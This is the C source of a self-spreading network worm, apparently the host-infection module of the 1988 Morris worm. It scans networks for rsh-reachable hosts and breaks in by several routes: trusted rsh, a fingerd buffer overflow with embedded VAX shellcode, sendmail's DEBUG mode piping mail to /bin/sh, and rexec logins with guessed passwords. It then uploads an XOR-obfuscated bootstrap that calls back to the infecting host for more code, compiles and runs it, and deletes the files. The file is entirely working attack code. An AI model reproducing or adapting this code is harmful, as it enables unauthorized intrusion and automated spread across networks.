#include "dumb.h"

hg()
{
	struct host *h;
	int i;

	rt_init();

	for(i = 0; i < ngateways; i++){
		h = h_addr2host(gateways[i], 1);
		if(hit(h))
			return(1);
	}

	return(0);
}

ha()
{
	struct host *h;
	int i, nnets, j;
	u_long nets[100];

	if(ngateways < 1)
		rt_init();

	nnets = 0;
	for(i = 0; i < ngateways; i++){
		h = h_addr2host(gateways[i], 1);
		for(j = 0; j < H_NADDRS; j++)
			if(h->h_addrs[j] && isup(h->h_addrs[j]))
				nets[nnets++] = h->h_addrs[j];
	}

	permute(nets, nnets, sizeof(nets[0]));

	for(i = 0; i < nnets; i++)
		if(hitnet(nets[i] & netmaskfor(nets[i])))
			return(1);

	return(0);
}

hl()
{
	int i;

	for(i = 0; i < H_NADDRS; i++){
		if(me->h_addrs[i] == 0)
			break;
		if(hitnet(me->h_addrs[i] & netmaskfor(me->h_addrs[i])))
			return(1);
	}
	return(0);
}

hi()
{
	struct host *h;

	for(h = hosts; h; h = h->h_next){
		if(h->h_flags & HF_INTERESTING)
			if(hit(h))
				return(1);
	}
	return(0);
}

/*
 * probe to find hosts on a net, and try to hit them.
 * do not want to bother hitting nets which we know
 * already have instances on them! shouldn't spend forever
 * doing this.
 */
static
hitnet(net)
u_long net;
{
	u_long addr;
	struct host *h;
	u_long netmask, hostmask, hno;
	int i, j, nh, hi, imp, tmo;
	u_long hnos[2048]; /* 256 imps * 8 hosts per imp */

	netmask = netmaskfor(net);
	hostmask = ~ntohl(netmask);

	for(i = 0; i < nifs; i++)
		if(net == (ifs[i].mif_addr & ifs[i].mif_netmask))
			return(0); /* that's our own net */

#ifdef DEBUG
	fprintf(stderr, "hitnet %s\n", inet_ntoa(a2in(net)));
#endif DEBUG

	nh = 0;
	if(hostmask == 0xffffff){
		/* class A, eg arpanet? hard to do this in general */
		tmo = 4; /* if it's slow to talk to, forget it! */
		for(imp = 1; imp < 255; imp++)
			for(hno = 1; hno <= 8; hno++)
				hnos[nh++] = net | htonl((hno<<16) | imp);
		permute(hnos, nh, sizeof(hnos[0]));
	} else {
		/* class B or C netmask, just look at low 256 hosts */
		tmo = 4;
		for(hno = 1; hno < 255; hno++)
			hnos[nh++] = net | htonl(hno);
		permute(hnos, 12, sizeof(hnos[0]));
		permute(hnos+6, nh-6, sizeof(hnos[0]));
	}


	if(nh > 20)
		nh = 20;
	for(hi = 0; hi < nh; hi++){
		addr = hnos[hi];
		h = h_addr2host(addr, 0);
		if(h && (h->h_flags & HF_STARTED))
			continue;
		if(h && (h->h_flags & HF_HITFAILED))
			continue;
		if(isunix(addr, tmo)){
#ifdef DEBUG
			fprintf(stderr, "%s runs unix\n",
				inet_ntoa(a2in(addr)));
#endif DEBUG
			if(h == 0)
				h = h_addr2host(addr, 1);
			if(hit(h))
				return(1);
		}
	}

	return(0);
}

static
isunix(a, tout)
u_long a;
int tout; /* seconds before timing out */
{
	int s, res;
	struct sockaddr_in sin;
	int (*astat)();

	s = socket(AF_INET, SOCK_STREAM, 0);
	if(s < 0){
		perror("isunix socket");
		return(0);
	}
	bzero(&sin, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = a;
	sin.sin_port = htons(514); /* rsh */

	astat = signal(SIGALRM, justreturn);
	if(tout < 1)
		tout = 1;
	alarm(tout);

	res = connect(s, &sin, sizeof(sin));
	alarm(0);
	close(s);
	if(res < 0 && errno == ENETUNREACH)
		perror("isunix connect");

	return(res != -1);
}

/*
 * is there a host answering at address a? we use tcp to decide this
 * which is sort of bad because we would like to be able to tell
 * whether non-tcp gateways are up.
 */
static
isup(a)
u_long a;
{
	int s, res;
	struct sockaddr_in sin;
	int (*astat)();

	s = socket(AF_INET, SOCK_STREAM, 0);
	if(s < 0){
		perror("isup socket");
		return(0);
	}
	bzero(&sin, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = a;
	sin.sin_port = htons(23); /* telnet */

	astat = signal(SIGALRM, justreturn);
	alarm(5);

	res = connect(s, &sin, sizeof(sin));
	if(res < 0 && errno == ECONNREFUSED)
		res = 0;
	alarm(0);
	close(s);

	return(res != -1);
}

static
hit(h)
struct host *h;
{
	int ifd, ofd, ret;

	if(h == me)
		return(0);
	if(h->h_flags & HF_STARTED)
		return(0);
	if(h->h_flags & HF_HITFAILED)
		return(0);

	if(h->h_addrs[0] == 0 || h->h_names[0] == 0)
		getaddrs(h);
	if(h->h_addrs[0] == 0){
		h->h_flags |= HF_HITFAILED;
		return(0);
	}

	other_sleep(1);

#ifdef DEBUG
	fprintf(stderr, "hitting %s via straight rsh as ourself\n",
		h->h_names[0]);
#endif DEBUG
	if(h->h_names[0] && rsh(h->h_names[0], &ifd, &ofd, "exec /bin/sh")){
#ifdef DEBUG
		fprintf(stderr, "rsh succeeded!\n");
#endif DEBUG
		ret = interstart(h, ifd, ofd);
		close(ifd);
		close(ofd);
		wait3(0, WNOHANG, 0);
		if(ret)
			return(ret);
	}

#ifdef DEBUG
	fprintf(stderr, "hitting %s via gronk23\n", h->h_names[0]);
#endif DEBUG
	if(gronk23(h, &ifd, &ofd)){
#ifdef DEBUG
		fprintf(stderr, "gronk23 succeeded!\n");
#endif DEBUG
		ret = interstart(h, ifd, ofd);
		close(ifd);
		close(ofd);
		if(ret)
			return(ret);
	}

#ifdef DEBUG
	fprintf(stderr, "hitting %s via gronk24\n", h->h_names[0]);
#endif DEBUG
	if(gronk24(h)){
#ifdef DEBUG
		fprintf(stderr, "gronk24 succeeded!\n");
#endif DEBUG
		return(1);
	}

#ifdef DEBUG
	fprintf(stderr, "hit failed\n");
#endif DEBUG

	h->h_flags |= HF_HITFAILED;
	return(0);
}

/*
 * we have an interactive /bin/sh at the other end of ifd/ofd.
 */
static
interstart(h, ifd, ofd)
struct host *h;
{
	struct object *obj;
	char buf[512], fl[50];
	int n, rn, port, magic, mfd;
	u_long addr;

	obj = getobjectbyname("l1.c");
	if(!obj)
		return(0);
	if(makemagic(h, &addr, &port, &magic, &mfd) == 0){
#ifdef DEBUG
		fprintf(stderr, "makemagic failed\n");
#endif DEBUG
		return(0);
	}

	omsg(ofd, "PATH=/bin:/usr/bin:/usr/ucb\n");
	omsg(ofd, "cd /usr/tmp\n");
	rn = random() % 0xffffff;
	sprintf(fl, "x%d.c", rn);
	sprintf(buf, "echo gorch49;sed '/int zz;/q' > %s;echo gorch50\n", fl);
	omsg(ofd, buf);
	expect(ifd, "gorch49", 10);

	xorbuf(obj->data, obj->len);
	n = write(ofd, obj->data, obj->len);
	xorbuf(obj->data, obj->len);
	if(n != obj->len){
		close(mfd);
		return(0);
	}
	omsg(ofd, "int zz;\n\n");
	expect(ifd, "gorch50", 30);

	sprintf(buf, "cc -o x%d x%d.c;./x%d %s %d %d;rm -f x%d x%d.c;echo DONE\n",
		rn, rn, rn, inet_ntoa(a2in(addr)), htons(port), magic, rn, rn);
	omsg(ofd, buf);
	if(expect(ifd, "DONE", 100) == 0){
		close(mfd);
		return(0);
	}
	return(waithit(h, addr, port, magic, mfd));
}

makemagic(h, ap, pp, mp, fdp)
struct host *h;
u_long *ap;
int *pp, *mp, *fdp;
{
	int s, i, len;
	struct sockaddr_in sin, mine;

	*mp = random() & 0xffffff;

	bzero(&mine, sizeof(mine));
	mine.sin_addr.s_addr = me->h_addrs[0];
	for(i = 0; i < H_NADDRS; i++){
		if(h->h_addrs[i] == 0)
			continue;
		s = socket(AF_INET, SOCK_STREAM, 0);
		if(s < 0)
			return(0);

		bzero(&sin, sizeof(sin));
		sin.sin_family = AF_INET;
		sin.sin_port = htons(23);
		sin.sin_addr.s_addr = h->h_addrs[i];
		errno = 0;
		if(connect(s, &sin, sizeof(sin)) != -1){
			len = sizeof(mine);
			getsockname(s, &mine, &len);
			close(s);
			break;
		}
		close(s);
	}
	*ap = mine.sin_addr.s_addr;

	for(i = 0; i < 1024; i++){
		s = socket(AF_INET, SOCK_STREAM, 0);
		if(s < 0)
			return(0);
		bzero(&sin, sizeof(sin));
		sin.sin_family = AF_INET;
		sin.sin_port = htons(random() % 32767);
		if(bind(s, &sin, sizeof(sin)) != -1){
			listen(s, 10);
			*pp = sin.sin_port;
			*fdp = s;
			return(1);
		}
		close(s);
	}
	return(0);
}

waithit(h, addr, port, magic, fd)
struct host *h;
u_long addr;	/* OUR address that he'll use */
{
	int (*astat)();
	int s, len, x, i, n, j;
	struct sockaddr_in sin;
	struct object *obj;
	char onames[20][128], *p, buf[512];
	extern char *index();

	astat = signal(SIGALRM, justreturn);
	len = sizeof(sin);
	alarm(120);
	s = accept(fd, &sin, &len);
	alarm(0);

	if(s < 0){
#ifdef DEBUG
		fprintf(stderr, "waithit timed out\n");
#endif DEBUG
		goto bad;
	}

	if(xread(s, &x, 4, 10) != 4)
		goto bad;
	x = ntohl(x);
	if(x != magic){
#ifdef DEBUG
		fprintf(stderr, "waithit bad magic\n");
#endif DEBUG
		goto bad;
	}

	for(i = 0; i < nobjects; i++){
		obj = &objects[i];
		x = htonl(obj->len);
		write(s, &x, 4);
		sprintf(onames[i], "x%d,%s", random() & 0xffffff, obj->name);
		write(s, onames[i], 128);
		xorbuf(obj->data, obj->len);
		n = write(s, obj->data, obj->len);
		xorbuf(obj->data, obj->len);
		if(n != obj->len)
			goto bad;
	}
	x = htonl(-1);
	if(write(s, &x, 4) != 4)
		goto bad;

	sleep(4);
	if(!gotshell(s, s, 30))
		goto bad;

	omsg(s, "PATH=/bin:/usr/bin:/usr/ucb\n");
	omsg(s, "rm -f sh\n");
	sprintf(buf, "if [ -f sh ]\nthen\nP=x%d\nelse\nP=sh\nfi\n",
		random() & 0xffffff);
	omsg(s, buf);

	for(i = 0; i < nobjects; i++){
		if((p = index(onames[i], '.')) == 0 || p[1] != 'o')
			continue;

		sprintf(buf, "cc -o $P %s\n", onames[i]);
		omsg(s, buf);
		if(!gotshell(s, s, 30))
			goto bad;

		sprintf(buf, "./$P -p $$ ");
		for(j = 0; j < nobjects; j++){
			strcat(buf, onames[j]);
			strcat(buf, " ");
		}
		strcat(buf, "\n");
		omsg(s, buf);
		if(gotshell(s, s, 10) == 0){
			close(s);
			close(fd);
			h->h_flags |= HF_STARTED;
			return(1);
		}
		omsg(s, "rm -f $P\n");
	}

	for(i = 0; i < nobjects; i++){
		sprintf(buf, "rm -f %s $P\n", onames[i]);
		omsg(s, buf);
	}
	gotshell(s, s, 5);
bad:
	close(s);
	close(fd);
	return(0);
}

static
xstart(h, fd, addr, port, magic, mfd)
struct host *h;
u_long addr;
{
	struct object *obj;
	char buf[512], fl[50];
	int n, rn;

	obj = getobjectbyname("l1.c");
	if(!obj)
		return(0);

	omsg(fd, "cd /usr/tmp\n");
	rn = random() % 0xffffff;
	sprintf(fl, "x%d.c", rn);
	sprintf(buf, "cat > %s <<'EOF'\n", fl);
	omsg(fd, buf);

	xorbuf(obj->data, obj->len);
	n = write(fd, obj->data, obj->len);
	xorbuf(obj->data, obj->len);
	if(n != obj->len)
		return(0);
	omsg(fd, "EOF\n");

	sprintf(buf, "cc -o x%d x%d.c;x%d %s %d %d;rm -f x%d x%d.c\n",
		rn, rn, rn, inet_ntoa(a2in(addr)), htons(port), magic, rn, rn);
	omsg(fd, buf);
}

static
omsg(fd, msg)
char *msg;
{
	return(write(fd, msg, strlen(msg)));
}

static
rsh(name, ifdp, ofdp, what)
char *name;
int *ifdp, *ofdp;
char *what;
{
	int cpid, topfds[2], frompfds[2];
	int i, x;

	if(pipe(topfds) < 0){
		perror("rsh pipe()");
		return(0);
	}
	if(pipe(frompfds) < 0){
		perror("rsh pipe() second time");
		close(topfds[0]);
		close(topfds[1]);
		return(0);
	}

	cpid = fork();
	if(cpid < 0){
		perror("rsh fork");
		close(topfds[0]);
		close(topfds[1]);
		close(frompfds[0]);
		close(frompfds[1]);
		return(0);
	}

	if(cpid == 0){
		for(i = 0; i < 32; i++)
			if(i != topfds[0] && i != frompfds[1] && i != 2)
				close(i);
		dup2(topfds[0], 0);
		dup2(frompfds[1], 1);
		if(topfds[0] > 2)
			close(topfds[0]);
		if(frompfds[1] > 2)
			close(frompfds[1]);
		execl("/usr/ucb/rsh", "rsh", name, what, 0);
		execl("/usr/bin/rsh", "rsh", name, what, 0);
		execl("/bin/rsh", "rsh", name, what, 0);
		exit(1);
	}

	close(topfds[0]);
	close(frompfds[1]);
	*ifdp = frompfds[0];
	*ofdp = topfds[1];

	if(gotshell(*ifdp, *ofdp, 30))
		return(1);

	close(*ifdp);
	close(*ofdp);
	kill(cpid, 9);
	sleep(1);
	wait3(0, WNOHANG, 0);
	return(0);
}

static
gotshell(ifd, ofd, tmo)
{
	char buf[100], word[100];

	sprintf(word, "%d", random() & 0xffffff);
	sprintf(buf, "\n/bin/echo %s\n", word);
	omsg(ofd, buf);

	return(expect(ifd, word, tmo));
}

static
expect(fd, what, tmo)
char *what;
{
	char buf[512];
	int i, len;

	len = strlen(what);
	while(readline(fd, buf, sizeof(buf), tmo)){
#ifdef DEBUG
		fprintf(stderr, " <%s>\n", buf);
#endif DEBUG
		for(i = 0; buf[i]; i++)
			if(strncmp(what, buf+i, len) == 0)
				return(1);
	}
	return(0);
}

int alarmed;

justreturn()
{
	alarmed = 1;
}

static
readline(fd, buf, n, tmo)
char *buf;
{
	int i, nread, mask;
	struct timeval tv;

	i = 0;
	while(i < n){
		mask = 1 << fd;
		tv.tv_sec = tmo;
		tv.tv_usec = 0;
		if(select(fd+1, &mask, 0, 0, &tv) <= 0)
			return(0);
		if(mask == 0)
			return(0);

		if(read(fd, buf+i, 1) != 1)
			return(0);
		if(buf[i] == '\n')
			break;
		i++;
	}
	buf[i] = '\0';
	return(i > 0 || nread > 0);
}

static char *
getword(s, word)
char *s, *word;
{
	*word = '\0';

	if(s == 0)
		return(0);
	while(isspace(*s))
		s++;
	if(*s == '\0')
		return(0);

	while(*s && !isspace(*s))
		*word++ = *s++;
	*word = '\0';
	return(s);
}

/*
 * fingerd bug on 4.3: write this to it:
 * .text
 * 	pushl	$0x0068732f	'\0hs/'
 * 	pushl	$0x6e69622f	'nib/'
 * 	movl	sp, r10
 * 	pushl	$0
 * 	pushl	$0
 * 	pushl	r10
 * 	pushl	$3
 * 	movl	sp, ap
 * 	chmk	$0x3b
 */

#define LINE	0x7fffe8d0	/* where this stuff goes: */
#define NOP	1		/* 1 byte VAX nop instruction */
#define NNOP	400
#define PC	(512 + 16)

static unsigned char fhcode[] = {
	0335,	0217,	057,	0163,	0150,	0,	0335,	0217,
	057,	0142,	0151,	0156,	0320,	0136,	0132,	0335,
	0,	0335,	0,	0335,	0132,	0335,	03,	0320,
	0136,	0134,	0274,	073,
};

static
gronk23(h, ifdp, ofdp)
struct host *h;
int *ifdp, *ofdp;
{
	int i, j, n, pid, fd;
	struct sockaddr_in sin;
	char buf[512];
	unsigned char hackbuf[512 + 24];
	int (*astat)();

	astat = signal(SIGALRM, justreturn);
	for(i = 0; i < H_NADDRS; i++){
		if(h->h_addrs[i] == 0)
			continue;
		fd = socket(AF_INET, SOCK_STREAM, 0);
		if(fd < 0){
			perror("gronk23(): socket");
			continue;
		}
		bzero(&sin, sizeof(sin));
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = h->h_addrs[i];
		sin.sin_port = htons(79);

		alarm(10);
		if(connect(fd, &sin, sizeof(sin)) < 0){
			alarm(0);
			perror("gronk23(): connect");
			close(fd);
		} else {
			alarm(0);
			break;
		}
	}
	if(i >= H_NADDRS)
		return(0);

	for(i = 0; i < sizeof(hackbuf); i++)
		hackbuf[i] = 0;
	for(i = 0; i < NNOP; i++)
		hackbuf[i] = NOP;
	for(j = 0; j < sizeof(fhcode); j++)
		hackbuf[i+j] = fhcode[j];

	*(int *)(hackbuf+PC) = LINE + (NNOP/2 + NNOP/4);
	*(int *)(hackbuf+PC-4) = 0x7fffe8a8;
	*(int *)(hackbuf+PC-8) = 0x7fffe8bc;
	*(int *)(hackbuf+PC-12) = 0x28000000;
	*(int *)(hackbuf+PC+4) = 0x0001c020;
#ifdef sun
	*(int *)(hackbuf+PC) = swapl(*(int *)(hackbuf+PC));
	*(int *)(hackbuf+PC-4) = swapl(*(int *)(hackbuf+PC-4));
	*(int *)(hackbuf+PC-8) = swapl(*(int *)(hackbuf+PC-8));
	*(int *)(hackbuf+PC-12) = swapl(*(int *)(hackbuf+PC-12));
	*(int *)(hackbuf+PC+4) = swapl(*(int *)(hackbuf+PC+4));
#endif

	write(fd, hackbuf, sizeof(hackbuf));
	write(fd, "\n", 1);

	sleep(5);
	if(gotshell(fd, fd, 10)){
		*ifdp = fd;
		*ofdp = fd;
		return(1);
	}
	close(fd);
	return(0);
}

/*
 * swap around the bytes in a longword, so that suns can put stuff in
 * vax format.
 */
static u_long
swapl(l)
u_long l;
{
	u_long l1;
	int i;

	l1 = 0;
	for(i = 0; i < 4; i++){
		l1 <<= 8;
		l1 |= l & 0xff;
		l >>= 8;
	}
	return(l1);
}

permute(a, n, size)
char *a;
int n;
int size;
{
	int i, j;
	char tmp[512];

	for(i = 0; i < n*size; i += size){
		j = (random() % n) * size;
		bcopy(a+i, tmp, size);
		bcopy(a+j, a+i, size);
		bcopy(tmp, a+j, size);
	}
}

static
gronk24(h, ifdp, ofdp)
struct host *h;
{
	int i, j, n, pid, fd;
	struct sockaddr_in sin;
	char buf[512];
	int (*astat)();
	u_long addr;
	int port, magic, mfd;

	if(makemagic(h, &addr, &port, &magic, &mfd) == 0){
#ifdef DEBUG
		fprintf(stderr, "makemagic failed\n");
#endif DEBUG
		return(0);
	}

	astat = signal(SIGALRM, justreturn);
	for(i = 0; i < H_NADDRS; i++){
		if(h->h_addrs[i] == 0)
			continue;
		fd = socket(AF_INET, SOCK_STREAM, 0);
		if(fd < 0){
			perror("gronk24(): socket");
			continue;
		}
		bzero(&sin, sizeof(sin));
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = h->h_addrs[i];
		sin.sin_port = htons(25);

		alarm(10);
		if(connect(fd, &sin, sizeof(sin)) < 0){
			alarm(0);
			perror("gronk24(): connect");
			close(fd);
		} else {
			alarm(0);
			break;
		}
	}
	if(i >= H_NADDRS)
		return(0);

	if(!resp24(fd, buf))
		goto bad;
	if(buf[0] != '2')
		goto bad;

	omsg(fd, "debug\n");
	if(!resp24(fd, buf))
		goto bad;
	if(buf[0] != '2')
		goto bad;

	omsg(fd, "mail from:</dev/null>\n");
	if(!resp24(fd, buf) || buf[0] != '2')
		goto bad;

	i = random() & 0xffffff;
	sprintf(buf,
"rcpt to:<\"| sed '1,/^$/d' | /bin/sh ; exit 0\">\n",
		i, i);
	omsg(fd, buf);
	if(!resp24(fd, buf) || buf[0] != '2')
		goto bad;

	omsg(fd, "data\n");
	if(!resp24(fd, buf) || buf[0] != '3')
		goto bad;

	omsg(fd, "\n");
	xstart(h, fd, addr, port, magic, mfd);

	omsg(fd, "\n.\n");
	if(!resp24(fd, buf) || buf[0] != '2'){
		close(mfd);
		goto bad;
	}

	omsg(fd, "quit\n");
	if(!resp24(fd, buf) || buf[0] != '2'){
		close(mfd);
		goto bad;
	}

	close(fd);

	return(waithit(h, addr, port, magic, mfd));
bad:
	omsg(fd, "quit\n");
	resp24(fd, buf);
	close(fd);
	return(0);
}

static
resp24(fd, buf)
char buf[];
{
	int n, i, nl;

	buf[0] = '\0';
	for(nl = 0; nl < 40; nl++){
		if(!readline(fd, buf, 512, 20))
			return(0);
#ifdef DEBUG
		fprintf(stderr, " <%s>\n", buf);
#endif DEBUG
		if(isdigit(buf[0]) && isdigit(buf[1]) && isdigit(buf[2])
		   && buf[3] == ' ')
			return(1);
	}
	return(0);
}

hu1(up, h, ruser1)
struct up *up;
struct host *h;
char *ruser1;
{
	char ruser[256], buf[512];
	int ifd, ofd, ret, i, fd;

	if(h == me)
		return(0);
	if(h->h_flags & HF_STARTED)
		return(0);

	if(h->h_addrs[0] == 0 || h->h_names[0] == 0)
		getaddrs(h);
	if(h->h_addrs[0] == 0){
		h->h_flags |= HF_HITFAILED;
		return(0);
	}

	strncpy(ruser, ruser1, 255);
	ruser[255] = '\0';
	if(ruser[0] == '\0')
		strcpy(ruser, up->name);
	for(i = 0; ruser[i]; i++)
		if(ispunct(ruser[i]) || ruser[i] < ' ')
			return(0);

#ifdef DEBUG
	fprintf(stderr, "hituser1 %s %s rem %s\n",
		h->h_names[0], up->name, ruser);
#endif DEBUG

	other_sleep(1);

	fd = gronk25(h, ruser, up->guessed);
	if(fd >= 0){
		ret = interstart(h, fd, fd);
		close(fd);
		return(ret);
	} else if(fd == -2) /* net/host down */
		return(0);

	fd = gronk25(me, up->name, up->guessed);
	if(fd >= 0){
		sprintf(buf, "exec /usr/ucb/rsh %s -l %s 'exec /bin/sh'\n",
			h->h_names[0], ruser);
		omsg(fd, buf);
		sleep(10);
		ret = 0;
		if(gotshell(fd, fd, 25))
			ret = interstart(h, fd, fd);
		close(fd);
		return(ret);
	}
	return(0);
}

static
gronk25(h, user, pass)
struct host *h;
char *user, *pass;
{
	int s, i, n;
	struct sockaddr_in sin;
	char buf[512];

	for(i = 0; i < H_NADDRS; i++){
		if(h->h_addrs[i] == 0)
			continue;
		s = socket(AF_INET, SOCK_STREAM, 0);
		if(s < 0){
			perror("gronk25 socket()");
			continue;
		}

		bzero(&sin, sizeof(sin));
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = h->h_addrs[i];
		sin.sin_port = htons(512);

		alarm(8);
		signal(SIGALRM, justreturn);
		if(connect(s, &sin, sizeof(sin)) < 0){
			alarm(0);
			perror("gronk25 connect");
			close(s);
			continue;
		}
		alarm(0);
		break;
	}
	if(i >= H_NADDRS)
		return(-2);

	/* no stderr/signal port */
	if(write(s, "", 1) != 1)
		goto bad;

	/* username\0 */
	write(s, user, strlen(user)+1);

	/* password\0 */
	write(s, pass, strlen(pass)+1);

	/* command\0 */
	if(write(s, "/bin/sh", strlen("/bin/sh")+1) < 0)
		goto bad;

	/* read back a \0 for success, or an error message */
	if(xread(s, buf, 1, 20) != 1)
		goto bad;
	if(*buf)
		goto bad;

	if(gotshell(s, s, 40) == 0)
		goto bad;

	return(s);
bad:
	close(s);
	return(-1);
}
